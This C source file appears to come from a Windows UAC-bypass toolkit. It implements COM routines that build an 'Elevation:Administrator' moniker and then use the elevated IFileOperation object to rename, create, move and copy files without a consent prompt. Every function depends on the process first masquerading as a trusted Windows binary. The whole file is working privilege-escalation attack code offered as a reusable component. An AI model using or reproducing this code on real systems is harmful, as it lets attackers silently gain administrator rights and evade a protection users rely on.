/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2017
*
*  TITLE:       COMFILEOP.C
*
*  VERSION:     2.74
*
*  DATE:        10 June 2017
*
*  IFileOperation based routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmMasqueradedCoGetObjectElevate
*
* Purpose:
*
* CoGetObject elevation as admin.
*
*/
HRESULT ucmMasqueradedCoGetObjectElevate(
    _In_ LPWSTR clsid,
    _In_ DWORD dwClassContext,
    _In_ REFIID riid,
    _Outptr_ void **ppv
)
{
    HRESULT     r = E_FAIL;
    BIND_OPTS3  bop;
    WCHAR       szElevationMoniker[MAX_PATH];

    if (clsid == NULL)
        return r;

    if (_strlen(clsid) > 64)
        return r;

    RtlSecureZeroMemory(szElevationMoniker, sizeof(szElevationMoniker));

    _strcpy(szElevationMoniker, L"Elevation:Administrator!new:");
    _strcat(szElevationMoniker, clsid);

    RtlSecureZeroMemory(&bop, sizeof(bop));
    bop.cbStruct = sizeof(bop);
    bop.dwClassContext = dwClassContext;

    return CoGetObject(szElevationMoniker, (BIND_OPTS *)&bop, riid, ppv);
}

/*
* ucmMasqueradedRenameElementCOM
*
* Purpose:
*
* Rename file/directory autoelevated.
* This function expects that supMasqueradeProcess was called on process initialization.
*
*/
BOOL ucmMasqueradedRenameElementCOM(
    _In_ LPWSTR OldName,
    _In_ LPWSTR NewName
)
{
    BOOL                bCond = FALSE, bResult = FALSE;
    IFileOperation     *FileOperation1 = NULL;
    IShellItem         *psiDestDir = NULL;
    HRESULT             r = E_FAIL;

    do {

        if ((OldName == NULL) || (NewName == NULL))
            break;

        r = CoCreateInstance(&CLSID_FileOperation, NULL,
            CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER, &IID_IFileOperation, &FileOperation1);

        if (r != S_OK) {
            break;
        }

        if (FileOperation1 != NULL) {
            FileOperation1->lpVtbl->Release(FileOperation1);
        }

        r = ucmMasqueradedCoGetObjectElevate(
            T_CLSID_FileOperation,
            CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER,
            &IID_IFileOperation,
            &FileOperation1);

        if (r != S_OK) {
            break;
        }
        if (FileOperation1 == NULL) {
            r = E_FAIL;
            break;
        }

        FileOperation1->lpVtbl->SetOperationFlags(FileOperation1, g_ctx.IFileOperationFlags);

        r = SHCreateItemFromParsingName(OldName, NULL, &IID_IShellItem, &psiDestDir);
        if (r != S_OK) {
            break;
        }

        r = FileOperation1->lpVtbl->RenameItem(FileOperation1, psiDestDir, NewName, NULL);
        if (r != S_OK) {
            break;
        }

        r = FileOperation1->lpVtbl->PerformOperations(FileOperation1);
        if (r != S_OK) {
            break;
        }

        psiDestDir->lpVtbl->Release(psiDestDir);
        psiDestDir = NULL;

        bResult = TRUE;

    } while (bCond);

    if (FileOperation1 != NULL) {
        FileOperation1->lpVtbl->Release(FileOperation1);
    }

    if (psiDestDir != NULL) {
        psiDestDir->lpVtbl->Release(psiDestDir);
    }

    return bResult;
}

/*
* ucmMasqueradedCreateSubDirectoryCOM
*
* Purpose:
*
* Create directory autoelevated.
* This function expects that supMasqueradeProcess was called on process initialization.
*
*/
BOOL ucmMasqueradedCreateSubDirectoryCOM(
    _In_ LPWSTR ParentDirectory,
    _In_ LPWSTR SubDirectory
)
{
    BOOL                bCond = FALSE, bResult = FALSE;
    IFileOperation     *FileOperation1 = NULL;
    IShellItem         *psiDestDir = NULL;
    HRESULT             r = E_FAIL;

    do {

        if ((SubDirectory == NULL) || (ParentDirectory == NULL))
            break;

        r = CoCreateInstance(&CLSID_FileOperation, NULL,
            CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER, &IID_IFileOperation, &FileOperation1);

        if (r != S_OK) {
            break;
        }

        if (FileOperation1 != NULL) {
            FileOperation1->lpVtbl->Release(FileOperation1);
        }

        r = ucmMasqueradedCoGetObjectElevate(
            T_CLSID_FileOperation,
            CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER,
            &IID_IFileOperation,
            &FileOperation1);

        if (r != S_OK) {
            break;
        }
        if (FileOperation1 == NULL) {
            r = E_FAIL;
            break;
        }

        FileOperation1->lpVtbl->SetOperationFlags(FileOperation1, g_ctx.IFileOperationFlags);

        r = SHCreateItemFromParsingName(ParentDirectory, NULL, &IID_IShellItem, &psiDestDir);
        if (r != S_OK) {
            break;
        }

        r = FileOperation1->lpVtbl->NewItem(FileOperation1, psiDestDir, FILE_ATTRIBUTE_DIRECTORY, SubDirectory, NULL, NULL);
        if (r != S_OK) {
            break;
        }

        r = FileOperation1->lpVtbl->PerformOperations(FileOperation1);
        if (r != S_OK) {
            break;
        }

        psiDestDir->lpVtbl->Release(psiDestDir);
        psiDestDir = NULL;

        bResult = TRUE;

    } while (bCond);

    if (FileOperation1 != NULL) {
        FileOperation1->lpVtbl->Release(FileOperation1);
    }

    if (psiDestDir != NULL) {
        psiDestDir->lpVtbl->Release(psiDestDir);
    }

    return bResult;
}

/*
* ucmMasqueradedMoveCopyFileCOM
*
* Purpose:
*
* Move or Copy file autoelevated.
* This function expects that supMasqueradeProcess was called on process initialization.
*
*/
BOOL ucmMasqueradedMoveCopyFileCOM(
    _In_ LPWSTR SourceFileName,
    _In_ LPWSTR DestinationDir,
    _In_ BOOL fMove
)
{
    BOOL                cond = FALSE;
    IFileOperation     *FileOperation1 = NULL;
    IShellItem         *isrc = NULL, *idst = NULL;
    SHELLEXECUTEINFOW   shexec;
    HRESULT             r = E_FAIL;

    do {

        if ((SourceFileName == NULL) || (DestinationDir == NULL))
            break;

        RtlSecureZeroMemory(&shexec, sizeof(shexec));

        r = CoCreateInstance(&CLSID_FileOperation, NULL,
            CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER, &IID_IFileOperation, &FileOperation1);

        if (r != S_OK)
            break;

        if (FileOperation1 != NULL)
            FileOperation1->lpVtbl->Release(FileOperation1);

        r = ucmMasqueradedCoGetObjectElevate(
            T_CLSID_FileOperation,
            CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER,
            &IID_IFileOperation,
            &FileOperation1);

        if (r != S_OK)
            break;

        if (FileOperation1 == NULL) {
            r = E_FAIL;
            break;
        }

        FileOperation1->lpVtbl->SetOperationFlags(FileOperation1, g_ctx.IFileOperationFlags);

        r = SHCreateItemFromParsingName(SourceFileName, NULL, &IID_IShellItem, &isrc);
        if (r != S_OK)
            break;

        r = SHCreateItemFromParsingName(DestinationDir, NULL, &IID_IShellItem, &idst);
        if (r != S_OK)
            break;

        if (fMove)
            r = FileOperation1->lpVtbl->MoveItem(FileOperation1, isrc, idst, NULL, NULL);
        else
            r = FileOperation1->lpVtbl->CopyItem(FileOperation1, isrc, idst, NULL, NULL);

        if (r != S_OK)
            break;

        r = FileOperation1->lpVtbl->PerformOperations(FileOperation1);
        if (r != S_OK)
            break;

        idst->lpVtbl->Release(idst);
        idst = NULL;
        isrc->lpVtbl->Release(isrc);
        isrc = NULL;

    } while (cond);

    if (FileOperation1 != NULL)
        FileOperation1->lpVtbl->Release(FileOperation1);

    if (isrc != NULL)
        isrc->lpVtbl->Release(isrc);

    if (idst != NULL)
        idst->lpVtbl->Release(idst);

    return (SUCCEEDED(r));
}

/*
* ucmMasqueradedMoveFileCOM
*
* Purpose:
*
* Move file autoelevated.
* This function expects that supMasqueradeProcess was called on process initialization.
*
*/
BOOL ucmMasqueradedMoveFileCOM(
    _In_ LPWSTR SourceFileName,
    _In_ LPWSTR DestinationDir
)
{
    return ucmMasqueradedMoveCopyFileCOM(SourceFileName, DestinationDir, TRUE);
}
